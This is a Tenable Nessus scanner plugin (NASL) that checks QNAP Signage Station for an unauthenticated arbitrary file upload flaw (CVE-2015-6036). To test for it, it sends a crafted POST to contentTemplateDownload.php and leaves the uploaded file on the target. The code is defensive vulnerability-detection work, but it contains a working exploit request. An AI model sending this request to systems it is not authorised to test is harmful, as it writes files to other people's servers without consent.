#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(90201);
  script_version("$Revision: 1.1 $");
  script_cvs_date("$Date: 2016/03/26 01:20:14 $");

  script_cve_id("CVE-2015-6036");
  script_xref(name:"CERT", value:"444472");

  script_name(english:"QNAP Signage Station Arbitrary File Upload Vulnerability");
  script_summary(english:"Checks for an arbitrary upload vulnerability in QNAP Signage Station.");
 
  script_set_attribute(attribute:"synopsis", value:
"The remote host contains a PHP script that is affected by an arbitrary
file upload vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of QNAP Signage Station running on the remote host is
affected by an arbitrary file upload vulnerability in the
contentTemplateDownload.php script. A remote attacker can exploit
this, via an HTTP request, to upload arbitrary files.");
  script_set_attribute(attribute:"solution", value:
"Upgrade to QNAP Signage Station version 2.0.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:N");

  script_set_attribute(attribute:"vuln_publication_date", value: "2016/02/25");
  script_set_attribute(attribute:"patch_publication_date", value: "2016/02/25");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/03/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:qnap:signage_station");
  script_end_attributes();
  
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2016 Tenable Network Security, Inc.");

  script_dependencies("signagestation_detect.nbin");
  script_require_keys("installed_sw/SignageStation");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "SignageStation";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];

post_url = 'http://localhost:'+port+'/';
post_description = '';
post_uuid = 'blank';
postdata = "url="+post_url+"&description="+post_description+"&uuid="+post_uuid+"&skip=0";
path = dir + "/contentTemplateDownload.php";

w = http_send_recv3(method:"GET", item:path, port:port, exit_on_fail:TRUE);
if (empty_or_null(w) || "200" >!< w[0]) audit(AUDIT_WEB_APP_NOT_AFFECTED, app, build_url(qs:dir,port:port));

w = http_send_recv3(method:"POST", item: path, port: port,
  content_type: "application/x-www-form-urlencoded",
  data: postdata);
if (empty_or_null(w)) audit(AUDIT_WEB_APP_NOT_AFFECTED, app, build_url(qs:dir,port:port));
res = w[2];

if ("Success" >< res) {
  report =
      '\nNessus was able to exploit a vulnerability in ' + app +
      '\nto perform an arbitrary file upload to the remote host' +
      '\nusing the following request :' +
      '\n' +
      '\n' + crap(data:"-", length:30) + ' snip ' +  crap(data:"-", length:30) +
      '\n  URL : ' + build_url(qs:path, port:port) +
      '\n  POST: ' + postdata +
      '\n' + crap(data:"-", length:30) + ' snip ' +  crap(data:"-", length:30) +
      '\n' +
      '\n' + 'Note: This file has not been removed by Nessus and will need to be' +
      '\n' + 'manually deleted (/share/SignageStation/qsourcezip/<guid>.zip.txt).' +
      '\n';

  security_report_v4(port:port, severity:SECURITY_WARNING, extra:report);
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, build_url(qs:dir,port:port));
